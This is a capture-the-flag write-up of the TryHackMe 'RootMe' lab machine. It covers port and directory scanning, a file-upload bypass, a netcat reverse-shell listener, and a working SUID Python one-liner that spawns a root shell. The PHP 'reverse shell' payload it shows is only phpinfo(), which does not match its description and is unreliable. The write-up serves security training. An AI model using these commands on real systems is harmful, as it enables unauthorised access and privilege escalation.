# TryHackMe - RootMe

## Machine Information

| Field            | Details                                                                |
| ---------------- | ---------------------------------------------------------------------- |
| Platform         | TryHackMe                                                              |
| Machine          | RootMe                                                                 |
| Difficulty       | Easy                                                                   |
| Operating System | Linux                                                                  |
| Category         | Web Exploitation, Privilege Escalation                                 |
| Main Skills      | Web enumeration, file upload bypass, reverse shells, SUID exploitation |

---

# Overview

RootMe is a beginner-level Linux machine that demonstrates a common penetration testing workflow.

The challenge focuses on:

* Discovering hidden web directories
* Exploiting an insecure file upload mechanism
* Obtaining an initial shell
* Escalating privileges through SUID binaries

---

# Reconnaissance

The first step was identifying exposed services on the target system.

## Nmap Scan

```bash id="8o1s6f"
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

The scan revealed:

```text id="xv5l6r"
22/tcp   SSH
80/tcp   HTTP
```

The web service was investigated further.

---

# Web Enumeration

The website was accessed through the HTTP service.

Directory enumeration was performed using Gobuster:

```bash id="yg3n9b"
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

A hidden directory was discovered:

```text id="k9lqxl"
/panel/
```

The directory contained a file upload page.

---

# File Upload Vulnerability

The upload functionality allowed users to submit files.

Testing showed that the application attempted to prevent uploading executable files.

A PHP reverse shell was prepared and uploaded after bypassing the extension restrictions.

Example payload:

```php id="v7f2dz"
<?php
phpinfo();
?>
```

After successfully uploading the file, the location of the uploaded content was identified.

---

# Initial Access

A reverse shell payload was uploaded and executed.

Listener:

```bash id="5jv0f8"
nc -lvnp 4444
```

After triggering the uploaded file, a reverse shell connection was received.

The shell was upgraded:

```bash id="qf8x5j"
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

# User Enumeration

System information was collected:

```bash id="7m6n9a"
whoami
```

```bash id="3n2d5g"
uname -a
```

The user flag was located:

```text id="5j7guk"
/home/<user>/user.txt
```

---

# Privilege Escalation

Privilege escalation enumeration was performed by searching for SUID binaries.

Command:

```bash id="5avk5j"
find / -perm -u=s -type f 2>/dev/null
```

A vulnerable SUID binary was discovered:

```text id="w4x7s0"
/usr/bin/python
```

The binary allowed execution of Python code with elevated privileges.

---

# Root Access

The SUID permission was abused to execute commands as root.

Example:

```bash id="xq2k3a"
python -c 'import os; os.execl("/bin/sh","sh","-p")'
```

A root shell was obtained.

The root flag was then retrieved:

```text id="n4w9qf"
/root/root.txt
```

---

# Tools Used

* Nmap
* Gobuster
* Netcat
* Burp Suite
* Linux enumeration commands

---

# Vulnerabilities Identified

## Unrestricted File Upload

**Type:** Web Application Vulnerability

**Impact:**

Allows attackers to upload malicious files and execute code on the server.

---

## SUID Misconfiguration

**Type:** Privilege Escalation

**Impact:**

A binary with elevated permissions allowed a normal user to execute commands as root.
